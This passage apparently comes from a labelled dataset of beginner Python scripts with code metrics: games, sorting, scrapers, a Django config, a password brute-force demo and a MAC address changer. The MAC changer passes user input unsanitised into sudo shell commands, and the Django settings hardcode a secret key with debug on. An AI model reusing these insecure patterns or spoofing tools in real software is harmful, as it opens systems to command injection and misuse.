        finalprofit.append(profit[jobsindex])
        finaldl.append(deadline[jobsindex])

    print(f""\n Profit {finalprofit}"")
    print(f""\n Deadline {finaldl}"")


if __name__ == ""__main__"":
    main()
",3855,70,76,18,2,2,29,4.0,19,14,6,27.0,19,,41,96.22039775975506,190.3981037807637,4.2631578947368425,medio,Yes,False,False,Low-Medium,id182
question3.py,"""""""Write a user-defined function named count() that will read
the contents of text file named âhappy.txtâ and count
the number of lines which starts with either âIâ or âMâ.""""""

import os
import time
file_name= input(""Enter the file name to create:- "")

# step1:
print(file_name)



def write_to_file(file_name):

    if os.path.exists(file_name):
        print(f""Error: {file_name} already exists."")

    else:
        with open(file_name, ""a"") as F:

            while True:
                text = input(""enter any text"")
                F.write(f""{text}\n"") 

                if input(""do you want to enter more, y/n"").lower() == ""n"":
                    break
        
# step2:
def check_first_letter():
    with open(file_name) as F:
        lines = F.read().split()

        # store all starting letters from each line in one string after converting to lower case
        first_letters = """".join([line[0].lower() for line in lines])

        count_i = first_letters.count(""i"")
        count_m = first_letters.count(""m"")

        print(f""The total number of sentences starting with I or M are {count_i + count_m}"")

if __name__ == ""__main__"":
    
    write_to_file(file_name)
    time.sleep(1)
    check_first_letter()
",1282,26,25,15,3,3,3,2.0,6,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,alto,No,True,False,Low,id183
sqlite_check.py,"from __future__ import print_function

import os
import sqlite3 as lite
import sys

# Script Name	: sqlite_check.py
# Author		: Craig Richards
# Created		: 20 May 2013
# Last Modified	:
# Version		: 1.0
# Modifications	:
# Description	: Runs checks to check my SQLITE database

dropbox = os.getenv(""dropbox"")
dbfile = ""Databases\jarvis.db""
master_db = os.path.join(dropbox, dbfile)
con = None

try:
    con = lite.connect(master_db)
    cur = con.cursor()
    cur.execute(""SELECT SQLITE_VERSION()"")
    data = cur.fetchone()
    print(""SQLite version: %s"" % data)


except lite.Error as e:

    print(""Error %s:"" % e.args[0])
    sys.exit(1)

finally:

    if con:
        con.close()

con = lite.connect(master_db)
cur = con.cursor()
cur.execute(""SELECT name FROM sqlite_master WHERE type='table'"")
rows = cur.fetchall()
for row in rows:
    print(row)

con = lite.connect(master_db)
cur = con.cursor()
cur.execute(""SELECT name FROM sqlite_master WHERE type='table'"")
while True:
    row = cur.fetchone()
    if row == None:
        break
    print(row[0])
",1110,34,34,11,7,7,0,0.0,0,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,medio,No,False,False,Low,id184
spiralmatrix.py,"n = int(input(""Enter the size of matrix:""))
t = 1
r = 0  # r stands for row
c = 0  # c stands for column
matrix = [[0 for x in range(n)] for y in range(n)]  # to initialise the matrix
if n % 2 == 0:
    k = n // 2
else:
    k = int((n / 2) + 1)
for i in range(k):
    while c < n:
        matrix[r][c] = t
        t = t + 1
        c = c + 1
    r = r + 1
    c = c - 1
    while r < n:
        matrix[r][c] = t
        t = t + 1
        r = r + 1
    r = r - 1
    c = c - 1
    while c >= i:
        matrix[r][c] = t
        c = c - 1
        t = t + 1
    c = c + 1
    r = r - 1
    while r > i:
        matrix[r][c] = t
        t = t + 1
        r = r - 1
    r = r + 1
    n = n - 1
    c = c + 1
for m in matrix:
    print(m)
",733,37,37,0,3,0,0,0.0,0,26,9,,10,,78,61.74860596185444,331.33834604859965,23.4,medio,No,True,False,,id185
tic-tac-toe.py,"import os
import time

board = ["" "", "" "", "" "", "" "", "" "", "" "", "" "", "" "", "" "", "" ""]
player = 1

########win Flags##########
Win = 1
Draw = -1
Running = 0
Stop = 1
###########################
Game = Running
Mark = ""X""

# This Function Draws Game Board
def DrawBoard():
    print("" %c | %c | %c "" % (board[1], board[2], board[3]))
    print(""___|___|___"")
    print("" %c | %c | %c "" % (board[4], board[5], board[6]))
    print(""___|___|___"")
    print("" %c | %c | %c "" % (board[7], board[8], board[9]))
    print(""   |   |   "")


# This Function Checks position is empty or not
def CheckPosition(x):
    if board[x] == "" "":
        return True
    else:
        return False


# This Function Checks player has won or not
def CheckWin():
    global Game
    # Horizontal winning condition
    if board[1] == board[2] and board[2] == board[3] and board[1] != "" "":
        Game = Win
    elif board[4] == board[5] and board[5] == board[6] and board[4] != "" "":
        Game = Win
    elif board[7] == board[8] and board[8] == board[9] and board[7] != "" "":
        Game = Win
    # Vertical Winning Condition
    elif board[1] == board[4] and board[4] == board[7] and board[1] != "" "":
        Game = Win
    elif board[2] == board[5] and board[5] == board[8] and board[2] != "" "":
        Game = Win
    elif board[3] == board[6] and board[6] == board[9] and board[3] != "" "":
        Game = Win
    # Diagonal Winning Condition
    elif board[1] == board[5] and board[5] == board[9] and board[5] != "" "":
        Game = Win
    elif board[3] == board[5] and board[5] == board[7] and board[5] != "" "":
        Game = Win
    # Match Tie or Draw Condition
    elif (
        board[1] != "" ""
        and board[2] != "" ""
        and board[3] != "" ""
        and board[4] != "" ""
        and board[5] != "" ""
        and board[6] != "" ""
        and board[7] != "" ""
        and board[8] != "" ""
        and board[9] != "" ""
    ):
        Game = Draw
    else:
        Game = Running


print(""Tic-Tac-Toe Game Designed By Sourabh Somani"")
print(""Player 1 [X] --- Player 2 [O]\n"")
print()
print()
print(""Please Wait..."")
time.sleep(3)
while Game == Running:
    os.system(""cls"")
    DrawBoard()
    if player % 2 != 0:
        print(""Player 1's chance"")
        Mark = ""X""
    else:
        print(""Player 2's chance"")
        Mark = ""O""
    choice = int(input(""Enter the position between [1-9] where you want to mark : ""))
    if CheckPosition(choice):
        board[choice] = Mark
        player += 1
        CheckWin()

os.system(""cls"")
DrawBoard()
if Game == Draw:
    print(""Game Draw"")
elif Game == Win:
    player -= 1
    if player % 2 != 0:
        print(""Player 1 Won"")
    else:
        print(""Player 2 Won"")
",2696,74,84,10,9,9,0,3.0,37,56,7,126.0,99,,182,675.9577898422846,1224.481522730502,4.454545454545454,bajo,No,True,False,High,id186
manage.py,"#!/usr/bin/env python
""""""Django's command-line utility for administrative tasks.""""""
import os
import sys


def main():
    """"""Run administrative tasks.""""""
    os.environ.setdefault(""DJANGO_SETTINGS_MODULE"", ""todo_site.settings"")
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            ""Couldn't import Django. Are you sure it's installed and ""
            ""available on your PYTHONPATH environment variable? Did you ""
            ""forget to activate a virtual environment?""
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == ""__main__"":
    main()
",665,13,15,4,1,3,0,1.0,2,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id187
logs.py,"# Script Name   : logs.py
# Author        : Craig Richards
# Created       : 13th October 2011
# Last Modified	: 14 February 2016
# Version		: 1.2
#
# Modifications	: 1.1 - Added the variable zip_program so you can set it for the zip program on whichever OS, so to run on a different OS just change the locations of these two variables.
#               : 1.2 - Tidy up comments and syntax
#
# Description   : This script will search for all *.log files in the given directory, zip them using the program you specify and then date stamp them

import os  # Load the Library Module
from time import strftime  # Load just the strftime Module from Time

logsdir = ""c:\puttylogs""  # Set the Variable logsdir
zip_program = ""zip.exe""  # Set the Variable zip_program - 1.1

for files in os.listdir(logsdir):  # Find all the files in the directory
    if files.endswith("".log""):  # Check to ensure the files in the directory end in .log
        files1 = (
            files + ""."" + strftime(""%Y-%m-%d"") + "".zip""
        )  # Create the Variable files1, this is the files in the directory, then we add a suffix with the date and the zip extension
        os.chdir(logsdir)  # Change directory to the logsdir
        os.system(
            zip_program + "" "" + files1 + "" "" + files
        )  # Zip the logs into dated zip files for each server. - 1.1
        os.remove(files)  # Remove the original log files
",1397,10,14,3,20,10,0,0.0,0,7,1,14.0,12,,21,43.01955000865388,77.70923408096293,0.5833333333333334,alto,No,False,False,Low,id188
Settings.py,"""""""
Django settings for todo_site project.

Generated by 'django-admin startproject' using Django 4.2.5.

For more information on this file, see
https://docs.djangoproject.com/en/4.2/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/4.2/ref/settings/
""""""

from pathlib import Path

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/4.2/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = ""django-insecure-5xdo&zrjq^i)0^g9v@_2e_r6+-!02807i$1pjhcm=19m7yufbz""

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []


# Application definition

INSTALLED_APPS = [
    ""todo"",
    ""django.contrib.admin"",
    ""django.contrib.auth"",
    ""django.contrib.contenttypes"",
    ""django.contrib.sessions"",
    ""django.contrib.messages"",
    ""django.contrib.staticfiles"",
]

MIDDLEWARE = [
    ""django.middleware.security.SecurityMiddleware"",
    ""django.contrib.sessions.middleware.SessionMiddleware"",
    ""django.middleware.common.CommonMiddleware"",
    ""django.middleware.csrf.CsrfViewMiddleware"",
    ""django.contrib.auth.middleware.AuthenticationMiddleware"",
    ""django.contrib.messages.middleware.MessageMiddleware"",
    ""django.middleware.clickjacking.XFrameOptionsMiddleware"",
]

ROOT_URLCONF = ""todo_site.urls""

TEMPLATES = [
    {
        ""BACKEND"": ""django.template.backends.django.DjangoTemplates"",
        ""DIRS"": [],
        ""APP_DIRS"": True,
        ""OPTIONS"": {
            ""context_processors"": [
                ""django.template.context_processors.debug"",
                ""django.template.context_processors.request"",
                ""django.contrib.auth.context_processors.auth"",
                ""django.contrib.messages.context_processors.messages"",
            ],
        },
    },
]

WSGI_APPLICATION = ""todo_site.wsgi.application""


# Database
# https://docs.djangoproject.com/en/4.2/ref/settings/#databases

DATABASES = {
    ""default"": {
        ""ENGINE"": ""django.db.backends.sqlite3"",
        ""NAME"": BASE_DIR / ""db.sqlite3"",
    }
}


# Password validation
# https://docs.djangoproject.com/en/4.2/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        ""NAME"": ""django.contrib.auth.password_validation.UserAttributeSimilarityValidator"",
    },
    {
        ""NAME"": ""django.contrib.auth.password_validation.MinimumLengthValidator"",
    },
    {
        ""NAME"": ""django.contrib.auth.password_validation.CommonPasswordValidator"",
    },
    {
        ""NAME"": ""django.contrib.auth.password_validation.NumericPasswordValidator"",
    },
]


# Internationalization
# https://docs.djangoproject.com/en/4.2/topics/i18n/

LANGUAGE_CODE = ""en-us""

TIME_ZONE = ""UTC""

USE_I18N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/4.2/howto/static-files/

STATIC_URL = ""static/""

# Default primary key field type
# https://docs.djangoproject.com/en/4.2/ref/settings/#default-auto-field

DEFAULT_AUTO_FIELD = ""django.db.models.BigAutoField""
",3242,22,66,34,16,16,8,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id189
TicTacToe.py,"def print_tic_tac_toe(values):
    print(""\n"")
    print(""\t     |     |"")
    print(""\t  {}  |  {}  |  {}"".format(values[0], values[1], values[2]))
    print('\t_____|_____|_____')
 
    print(""\t     |     |"")
    print(""\t  {}  |  {}  |  {}"".format(values[3], values[4], values[5]))
    print('\t_____|_____|_____')
 
    print(""\t     |     |"")
 
    print(""\t  {}  |  {}  |  {}"".format(values[6], values[7], values[8]))
    print(""\t     |     |"")
    print(""\n"")
 
 
# Function to print the score-board
def print_scoreboard(score_board):
    print(""\t--------------------------------"")
    print(""\t              SCOREBOARD       "")
    print(""\t--------------------------------"")
 
    players = list(score_board.keys())
    print(""\t   "", players[0], ""\t    "", score_board[players[0]])
    print(""\t   "", players[1], ""\t    "", score_board[players[1]])
 
    print(""\t--------------------------------\n"")
 
# Function to check if any player has won
def check_win(player_pos, cur_player):
 
    # All possible winning combinations
    soln = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [1, 4, 7], [2, 5, 8], [3, 6, 9], [1, 5, 9], [3, 5, 7]]
 
    # Loop to check if any winning combination is satisfied
    for x in soln:
        if all(y in player_pos[cur_player] for y in x):
 
            # Return True if any winning combination satisfies
            return True
    # Return False if no combination is satisfied       
    return False       
 
# Function to check if the game is drawn
def check_draw(player_pos):
    if len(player_pos['X']) + len(player_pos['O']) == 9:
        return True
    return False       
 
# Function for a single game of Tic Tac Toe
def single_game(cur_player):
 
    # Represents the Tic Tac Toe
    values = [' ' for x in range(9)]
     
    # Stores the positions occupied by X and O
    player_pos = {'X':[], 'O':[]}
     
    # Game Loop for a single game of Tic Tac Toe
    while True:
        print_tic_tac_toe(values)
         
        # Try exception block for MOVE input
        try:
            print(""Player "", cur_player, "" turn. Which box? : "", end="""")
            move = int(input()) 
        except ValueError:
            print(""Wrong Input!!! Try Again"")
            continue
 
        # Sanity check for MOVE inout
        if move < 1 or move > 9:
            print(""Wrong Input!!! Try Again"")
            continue
 
        # Check if the box is not occupied already
        if values[move-1] != ' ':
            print(""Place already filled. Try again!!"")
            continue
 
        # Update game information
 
        # Updating grid status 
        values[move-1] = cur_player
 
        # Updating player positions
        player_pos[cur_player].append(move)
 
        # Function call for checking win
        if check_win(player_pos, cur_player):
            print_tic_tac_toe(values)
            print(""Player "", cur_player, "" has won the game!!"")     
            print(""\n"")
            return cur_player
 
        # Function call for checking draw game
        if check_draw(player_pos):
            print_tic_tac_toe(values)
            print(""Game Drawn"")
            print(""\n"")
            return 'D'
 
        # Switch player moves
        if cur_player == 'X':
            cur_player = 'O'
        else:
            cur_player = 'X'
 
if __name__ == ""__main__"":
 
    print(""Player 1"")
    player1 = input(""Enter the name : "")
    print(""\n"")
 
    print(""Player 2"")
    player2 = input(""Enter the name : "")
    print(""\n"")
     
    # Stores the player who chooses X and O
    cur_player = player1
 
    # Stores the choice of players
    player_choice = {'X' : """", 'O' : """"}
 
    # Stores the options
    options = ['X', 'O']
 
    # Stores the scoreboard
    score_board = {player1: 0, player2: 0}
    print_scoreboard(score_board)
 
    # Game Loop for a series of Tic Tac Toe
    # The loop runs until the players quit 
    while True:
 
        # Player choice Menu
        print(""Turn to choose for"", cur_player)
        print(""Enter 1 for X"")
        print(""Enter 2 for O"")
        print(""Enter 3 to Quit"")
 
        # Try exception for CHOICE input
        try:
            choice = int(input())   
        except ValueError:
            print(""Wrong Input!!! Try Again\n"")
            continue
 
        # Conditions for player choice  
        if choice == 1:
            player_choice['X'] = cur_player
            if cur_player == player1:
                player_choice['O'] = player2
            else:
                player_choice['O'] = player1
 
        elif choice == 2:
            player_choice['O'] = cur_player
            if cur_player == player1:
                player_choice['X'] = player2
            else:
                player_choice['X'] = player1
         
        elif choice == 3:
            print(""Final Scores"")
            print_scoreboard(score_board)
            break  
 
        else:
            print(""Wrong Choice!!!! Try Again\n"")
 
        # Stores the winner in a single game of Tic Tac Toe
        winner = single_game(options[choice-1])
         
        # Edits the scoreboard according to the winner
        if winner != 'D' :
            player_won = player_choice[winner]
            score_board[player_won] = score_board[player_won] + 1
 
        print_scoreboard(score_board)
        # Switch player who chooses X or O
        if cur_player == player1:
            cur_player = player2
        else:
            cur_player = player1
",5456,115,112,42,32,32,0,5.0,18,20,8,40.0,26,,60,146.2114326716684,305.2477704750204,6.153846153846154,medio,No,True,False,Medium,id190
selectionSort.py,"list = []

N = int(input(""Enter The Size Of List""))

for i in range(0, N):
    a = int(input(""Enter The number""))
    list.append(a)


# Let's sort list in ascending order using Selection Sort
# Every time The Element Of List is fetched and the smallest element in remaining list is found and if it comes out
# to be smaller than the element fetched then it is swapped with smallest number.

for i in range(0, len(list) - 1):
    smallest = list[i + 1]
    k = 0
    for j in range(i + 1, len(list)):
        if list[j] <= smallest:
            smallest = list[j]
            k = j

    if smallest < list[i]:
        temp = list[i]
        list[i] = list[k]
        list[k] = temp

print(list)
",695,17,17,7,3,3,0,0.0,0,5,4,10.0,6,,15,23.509775004326936,49.82892142331044,3.333333333333333,alto,No,True,False,Low,id191
linear_search.py,"num = int(input(""Enter size of list: \t""))
list = [int(input(""Enter any number: \t"")) for _ in range(num)]

x = int(input(""\nEnter number to search: \t""))

for position, number in enumerate(list):
    if number == x:
        print(f""\n{x} found at position {position}"")
else:
    print(f""list: {list}"")
    print(f""{x} is not in list"")",335,9,9,2,0,0,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,True,False,Low,id192
Python Program for Product of unique prime factors of a number.py,"# Python program to find sum of given 
# series. 

def productPrimeFactors(n): 
	product = 1
	
	for i in range(2, n+1): 
		if (n % i == 0): 
			isPrime = 1
			
			for j in range(2, int(i/2 + 1)): 
				if (i % j == 0): 
					isPrime = 0
					break
				
			# condition if \'i\' is Prime number 
			# as well as factor of num 
			if (isPrime): 
				product = product * i 
				
	return product 
	
	
	
# main() 
n = 44
print (productPrimeFactors(n)) 

# Contributed by _omg 
",470,14,14,9,6,6,0,1.0,6,8,5,16.0,10,,24,44.82892142331043,93.76537429460444,4.0,alto,No,False,False,Low,id193
Simple calculator.py,"# Program to make a simple calculator

# This function adds two numbers
def add(x, y):
    return x + y

# This function subtracts two numbers
def subtract(x, y):
    return x - y

# This function multiplies two numbers
def multiply(x, y):
    return x * y

# This function divides two numbers
def divide(x, y):
    if(y==0):
        raise Exception(""Divisor cannot be zero"")
    return x / y


print(""Select operation."")
print(""1.Add"")
print(""2.Subtract"")
print(""3.Multiply"")
print(""4.Divide"")

while True:
    # Take input from the user
    choice = input(""Enter choice(1/2/3/4): "")

    # Check if choice is one of the four options
    if choice in ('1', '2', '3', '4'):
        num1 = float(input(""Enter first number: ""))
        num2 = float(input(""Enter second number: ""))

        if choice == '1':
            print(num1, ""+"", num2, ""="", add(num1, num2))

        elif choice == '2':
            print(num1, ""-"", num2, ""="", subtract(num1, num2))

        elif choice == '3':
            print(num1, ""*"", num2, ""="", multiply(num1, num2))

        elif choice == '4':
            print(num1, ""/"", num2, ""="", divide(num1, num2))
        break
    else:
        print(""Invalid Input"")
",1189,31,31,12,7,7,0,4.0,5,10,6,20.0,15,,30,74.11313393845472,131.76952268336282,4.0,medio,No,True,False,Low-Medium,id194
BruteForce.py,"from itertools import product


def findPassword(chars, function, show=50, format_=""%s""):

    password = None
    attempts = 0
    size = 1
    stop = False

    while not stop:

        # ObtÃ©m todas as combinaÃ§Ãµes possÃ­veis com os dÃ­gitos do parÃ¢metro ""chars"".
        for pw in product(chars, repeat=size):

            password = """".join(pw)

            # Imprime a senha que serÃ¡ tentada.
            if attempts % show == 0:
                print(format_ % password)

            # Verifica se a senha Ã© a correta.
            if function(password):
                stop = True
                break
            else:
                attempts += 1
        size += 1

    return password, attempts


def getChars():
    """"""
    MÃ©todo para obter uma lista contendo todas as
    letras do alfabeto e nÃºmeros.
    """"""
    chars = []

    # Acrescenta Ã  lista todas as letras maiÃºsculas
    for id_ in range(ord(""A""), ord(""Z"") + 1):
        chars.append(chr(id_))

    # Acrescenta Ã  lista todas as letras minÃºsculas
    for id_ in range(ord(""a""), ord(""z"") + 1):
        chars.append(chr(id_))

    # Acrescenta Ã  lista todos os nÃºmeros
    for number in range(10):
        chars.append(str(number))

    return chars


# Se este mÃ³dulo nÃ£o for importado, o programa serÃ¡ testado.
# Para realizar o teste, o usuÃ¡rio deverÃ¡ inserir uma senha para ser encontrada.

if __name__ == ""__main__"":

    import datetime
    import time

    # Pede ao usuÃ¡rio uma senha
    pw = input(""\n Type a password: "")
    print(""\n"")

    def testFunction(password):
        global pw
        if password == pw:
            return True
        else:
            return False

    # ObtÃ©m os dÃ­gitos que uma senha pode ter
    chars = getChars()

    t = time.process_time()

    # ObtÃ©m a senha encontrada e o mÃºmero de tentativas
    password, attempts = findPassword(
        chars, testFunction, show=1000, format_="" Trying %s""
    )

    t = datetime.timedelta(seconds=int(time.process_time() - t))
    input(f""\n\n Password found: {password}\n Attempts: {attempts}\n Time: {t}\n"")
",2097,44,45,25,11,11,4,3.0,11,11,5,21.0,18,,32,86.66829050039843,144.75398259382442,2.9166666666666665,medio,No,True,False,Low,id195
GroupSms_Way2.py,"from __future__ import print_function

import sys
from getpass import getpass

import cookielib
import urllib2

try:
    input = raw_input
except NameError:
    pass

username = input(""Enter mobile number:"")
passwd = getpass()
message = input(""Enter Message:"")
# Fill the list with Recipients
x = input(""Enter Mobile numbers seperated with comma:"")
num = x.split("","")
message = ""+"".join(message.split("" ""))

# Logging into the SMS Site
url = ""http://site24.way2sms.com/Login1.action?""
data = ""username={0}&password={1}&Submit=Sign+in"".format(username, passwd)

# For Cookies:
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

# Adding Header detail:
opener.addheaders = [
    (
        ""User-Agent"",
        ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 ""
        ""Safari/537.36"",
    )
]

try:
    usock = opener.open(url, data)
except IOError:
    print(""Error while logging in."")
    sys.exit(1)

jession_id = str(cj).split(""~"")[1].split("" "")[0]
send_sms_url = ""http://site24.way2sms.com/smstoss.action?""

opener.addheaders = [
    (""Referer"", ""http://site25.way2sms.com/sendSMS?Token=%s"" % jession_id)
]

try:
    for number in num:
        send_sms_data = (
            ""ssaction=ss&Token={0}&mobile={1}&message={2}&msgLen=136"".format(
                jession_id, number, message
            )
        )
        sms_sent_page = opener.open(send_sms_url, send_sms_data)
except IOError:
    print(""Error while sending message"")

print(""SMS has been sent."")
sys.exit(1)
",1560,36,48,12,4,4,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,No,True,False,Low,id196
news_articles__scraper.py,"# -*- coding: utf-8 -*-
""""""News_Articles__Scraper.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1v1XaNvdBmHIG79KQyaVUl793rKsV7qTD

***Uncomment the line to install newspaper3k first***
""""""

# ! pip install newspaper3k

import pickle
import re
import sys
import urllib

import pandas as pd
import requests

# importing necessary libraries
from bs4 import BeautifulSoup
from newspaper import Article

# Extracting links for all the pages (1 to 158) of boomlive fake news section
fakearticle_links = []
for i in range(1, 159):
    url = ""https://www.boomlive.in/fake-news/"" + str(i)
    try:
        # this might throw an exception if something goes wrong.
        page = requests.get(url)

        # send requests
        page = requests.get(url)
        soup = BeautifulSoup(page.text, ""html.parser"")

        # Collecting all the links in a list
        for content in soup.find_all(""h2"", attrs={""class"": ""entry-title""}):
            link = content.find(""a"")
            fakearticle_links.append(link.get(""href""))

    # this describes what to do if an exception is thrown
    except Exception as e:
        # get the exception information
        error_type, error_obj, error_info = sys.exc_info()
        # print the link that cause the problem
        print(""ERROR FOR LINK:"", url)
        # print error info and line that threw the exception
        print(error_type, ""Line:"", error_info.tb_lineno)
        continue

fakearticle_links[:5]

len(fakearticle_links)

fakearticle_links[1888:]

import matplotlib.pyplot as plt
import pandas as pd

import numpy as np

""""""We have to modify the links so that the links actually work as we can see that the string extracted is the last part of the url!

**We have to add 'https://www.boomlive.in/fake-news' to the extracted links.**
""""""

# Modify the links so that it takes us to the particular website
str1 = ""https://www.boomlive.in/fake-news""
fakearticle_links = [str1 + lnk for lnk in fakearticle_links]

fakearticle_links[6:10]

""""""**The links are modified and is working :)**

***Creating a dataset of all the fake articles***
""""""

# Create a dataset for storing the news articles
news_dataset = pd.DataFrame(fakearticle_links, columns=[""URL""])

news_dataset.head()

title, text, summary, keywords, published_on, author = (
    [],
    [],
    [],
    [],
    [],
    [],
)  # Creating empty lists to store the data
for Url in fakearticle_links:
    article = Article(Url)

    # Call the download and parse methods to download information
    try:
        article.download()
        article.parse()
        article.nlp()
    except Exception as error:
        print(f""exception : {error}"")
        pass

    # Scrape the contents of article
    title.append(article.title)  # extracts the title of the article
    text.append(article.text)  # extracts the whole text of article
    summary.append(article.summary)  # gives us a summary abou the article
    keywords.append("", "".join(article.keywords))  # the main keywords used in it
    published_on.append(article.publish_date)  # the date on which it was published
    author.append(article.authors)  # the authors of the article

""""""**Checking the lists created**""""""

text[6]

keywords[1]

published_on[6]

author[6]

# Adding the columns in the fake news dataset
news_dataset[""title""] = title
news_dataset[""text""] = text
news_dataset[""keywords""] = keywords
news_dataset[""published date""] = published_on
news_dataset[""author""] = author

# Check the first five columns of dataset created
news_dataset.head()

""""""**Converting the dataset to a csv file**""""""

news_dataset.to_csv(""Fake_news.csv"")

""""""**Reading the csv file**""""""

df = pd.read_csv(""Fake_news.csv"")

# Checking the last 5 rows of the csv file
df.tail(5)

""""""**Download the csv file in local machine**""""""

from google.colab import files

files.download(""Fake_news.csv"")

""""""**Scraping news from Times of India**""""""

TOIarticle_links = (
    []
)  # Creating an empty list of all the urls of news from Times of India site

# Extracting links for all the pages (2 to 125) of boomlive fake news section
for i in range(2, 126):
    url = ""https://timesofindia.indiatimes.com/news/"" + str(i)

    try:
        # send requests
        page = requests.get(url)
        soup = BeautifulSoup(page.text, ""html.parser"")

        # Collecting all the links in a list
        for content in soup.find_all(""span"", attrs={""class"": ""w_tle""}):
            link = content.find(""a"")
            TOIarticle_links.append(link.get(""href""))

    # this describes what to do if an exception is thrown
    except Exception as e:
        # get the exception information
        error_type, error_obj, error_info = sys.exc_info()
        # print the link that cause the problem
        print(""ERROR FOR LINK:"", url)
        # print error info and line that threw the exception
        print(error_type, ""Line:"", error_info.tb_lineno)
        continue

TOIarticle_links[6:15]

len(TOIarticle_links)

str2 = ""https://timesofindia.indiatimes.com""
TOIarticle_links = [str2 + lnk for lnk in TOIarticle_links if lnk[0] == ""/""]

TOIarticle_links[5:8]

len(TOIarticle_links)

title, text, summary, keywords, published_on, author = (
    [],
    [],
    [],
    [],
    [],
    [],
)  # Creating empty lists to store the data
for Url in TOIarticle_links:
    article = Article(Url)

    # Call the download and parse methods to download information
    try:
        article.download()
        article.parse()
        article.nlp()
    except Exception:
        pass

    # Scrape the contents of article
    title.append(article.title)  # extracts the title of the article
    text.append(article.text)  # extracts the whole text of article
    summary.append(article.summary)  # gives us a summary abou the article
    keywords.append("", "".join(article.keywords))  # the main keywords used in it
    published_on.append(article.publish_date)  # the date on which it was published
    author.append(article.authors)  # the authors of the article

title[5]

TOI_dataset = pd.DataFrame(TOIarticle_links, columns=[""URL""])
# Adding the columns in the TOI news dataset
TOI_dataset[""title""] = title
TOI_dataset[""text""] = text
TOI_dataset[""keywords""] = keywords
TOI_dataset[""published date""] = published_on
TOI_dataset[""author""] = author

TOI_dataset.head()

TOI_dataset.to_csv(""TOI_news_dataset.csv"")

dt = pd.read_csv(""TOI_news_dataset.csv"")

dt.tail(3)

from google.colab import files

files.download(""TOI_news_dataset.csv"")
",6527,126,129,64,43,33,12,0.0,0,5,2,10.0,9,,15,30.529325012980813,51.89147427955947,1.1111111111111112,medio,No,False,False,Low,id197
changemac.py,"# Author- RIZWAN AHMAD

# Simple python Script to change mac address of linux generate random or enter mac address


import random
from subprocess import PIPE, Popen


# function for returning terminal command
def cret(command):
    process = Popen(args=command, stdout=PIPE, shell=True)
    return process.communicate()[0]


# function for genrate mac address random
def randmac():
    return [
        0x00,
        0x16,
        0x3E,
        random.randint(0x00, 0x7F),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
    ]


def retrandmac(mac):
    return "":"".join(map(lambda x: ""%02x"" % x, mac))


print(""                                             +-+-+-+ +-+-+-+-+-+-+-+"")
print(""                                             |M|A|C| |c|h|a|n|g|e|r|"")
print(""                                             +-+-+-+ +-+-+-+-+-+-+-+"")
# finding wireless interface name that should start with wl e.g.-wlan0,wlp3s0
infname = cret('ifconfig -a  | egrep ""^[wl-wl]+"" | sed ""s/: .*//"" | grep -v ""lo""')
# INTERFACE NAME 6 character so return 6 last character
infname = infname[:6]
infname = infname.decode(""utf-8"")
# GETTING MAC Address from /sys/class/net/wlan0/address directory
cmdgetmac = ""cat /sys/class/net/"" + infname + ""/address""
crrntmac = cret(""cat /sys/class/net/"" + infname + ""/address"")
crrntmac = crrntmac.decode(""utf-8"")
print(
    ""Your Current mac address = ""
    + crrntmac
    + ""\nEnter Option to change Your MAC:\n1. Enter MAC address manually \n2. Automatic Random MAC address""
)
opt = int(input())

if opt == 1:
    print(""Please Enter Your New MAC address: \nExmple:  46:d2:f4:0c:2a:50"")

    newmac = input()
    print(""Please wait changing  mac address.................."")

    # first turn off wifi
    cret(""nmcli radio wifi off"")

    changemaccmd = ""sudo ip link set dev "" + infname + "" address "" + newmac
    # executing command with new mac address
    cret(changemaccmd)
    # turning on wifi
    cret(""nmcli radio wifi on"")
    # GETTING MAC Address from /sys/class/net/wlan0/address directory
    cr = cret(""cat /sys/class/net/"" + infname + ""/address"")
    cr = cr.decode(""utf-8"")

    print(""\nNow Your Current mac address = "" + cr)


elif opt == 2:
    genmac = retrandmac(randmac())
    print(""Please wait generating new mac address....................."")
    cret(""nmcli radio wifi off"")
    changemaccmd = ""sudo ip link set dev "" + infname + "" address "" + genmac
    cret(changemaccmd)
    cret(""nmcli radio wifi on"")
    cr = cret(""cat /sys/class/net/"" + infname + ""/address"")
    cr = cr.decode(""utf-8"")
    print(""Now Your Current mac address = "" + cr)

else:
    print(""You Have Selected wrong Option"")
",2668,45,54,19,11,11,0,3.0,3,21,3,42.0,27,,63,133.13685006057713,309.1341075233367,2.333333333333333,medio,No,True,True,Low-Medium,id198
fileinfo.py,"# Script Name       : fileinfo.py
# Author            : Not sure where I got this from
# Created           : 28th November 2011
# Last Modified     : 23th March 2020
# Version           : 1.0
# Modifications     :

# Description           : Show file information for a given file

# get file information using os.stat()
# tested with Python24 vegsaeat 25sep2006
from __future__ import print_function

import os
import stat  # index constants for os.stat()
import sys
import time

if sys.version_info >= (3, 0):
    raw_input = input

file_name = raw_input(""Enter a file name: "")  # pick a file you have
count = 0
t_char = 0

try:
    with open(file_name) as f:
        # Source: https://stackoverflow.com/a/1019572
        count = sum(1 for line in f)
        f.seek(0)
        t_char = sum([len(line) for line in f])
except FileNotFoundError as e:
    print(e)
    sys.exit(1)
